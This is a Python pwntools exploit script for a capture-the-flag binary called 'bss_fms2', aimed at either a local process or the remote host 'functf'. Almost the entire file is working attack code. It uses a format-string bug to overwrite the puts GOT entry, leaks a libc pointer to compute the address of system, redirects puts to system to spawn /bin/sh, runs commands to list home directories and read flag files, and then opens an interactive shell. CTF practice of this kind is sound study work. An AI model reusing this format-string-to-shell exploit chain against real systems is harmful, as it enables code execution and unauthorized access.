from pwn import *

context.clear(arch='amd64')
if len(sys.argv)==1:
    p=process("linux_server64")
    buf=p.recvuntil("1...\n")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
elif sys.argv[1]=="3":
    p=remote("functf",18009)

print "exp : bss_fms2"

buf=p.recvuntil("== Let's do bss fms 2 ==\n")
print buf

def make_fmsstr(dest_addr,src_addr):

    buf=fmtstr_payload(38, {0x0: src_addr}, write_size='short')

    payload=""
    payload+="A"*0x20
    payload+=buf[0x20:]
    payload+="C"*(0x100-len(payload))
    payload+=p64(dest_addr)
    payload+=p64(dest_addr+2)
    payload+=p64(dest_addr+4)
    payload+=p64(dest_addr+6)
    return payload

def make_fms():
    buf="%77$p"
    buf+="%%%dc"%(0x8)
    #buf+="|%38$p|"
    buf+="|%38$hn|"
    #buf="%12$hhn"
    return buf

def make_fms_check():
    buf=""
    for i in range(1,100):
        buf+="-%d:%%"%(i)+"%d"%i+"$p"
    return buf

puts_got = 0x601018
vul2     = 0x0000000000400783

##############################################################
# phase 1 : change puts GOT to vul2
##############################################################
log.info("phase 1")
payload=""
payload+=make_fmsstr(puts_got,vul2)
print hexdump(payload)

p.sendline(payload)
        
buf=p.recvuntil("AAAAAAAA")
print hexdump(buf)
buf=p.recvuntil("your name?")
p.sendline("CCCCCCCC")

##############################################################
# phase 2 : leak
##############################################################
log.info("phase 2")
payload="%124$p"
p.sendline(payload)
buf=p.recvuntil("your name?")
p.sendline("CCCCCCCC")
print hexdump(buf)
libc_IO_file_jumps = int(buf[0xb:0x19],16)
libc_elf=ELF("../r64.libc.so.6")
libc_base=libc_IO_file_jumps-libc_elf.sym["_IO_file_jumps"]
libc_system=libc_base+libc_elf.sym["system"]
print 'libc_IO_file_jumps:',hex(libc_IO_file_jumps)
print 'libc_base:',hex(libc_base)
print 'libc_system:',hex(libc_system)

##############################################################
# phase 3 : /bin/sh
##############################################################
log.info("phase 3")
payload=""
payload+=make_fmsstr(puts_got,libc_system)
p.sendline(payload)

buf=p.recvuntil("your name?")
p.sendline("/bin/sh")

p.sendline("id;ls -al /home/bss_fms2;cat /home/*/flag")
p.interactive()

'''
vagrant@vagrant:/hack/fun_ctf_2017/bss_fms2$ readelf -a bss_fms2|grep dtors
29: 00000000004006d0     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
31: 0000000000600e18     0 OBJECT  LOCAL  DEFAULT   19 __do_global_dtors_aux_fin
fail....
'''
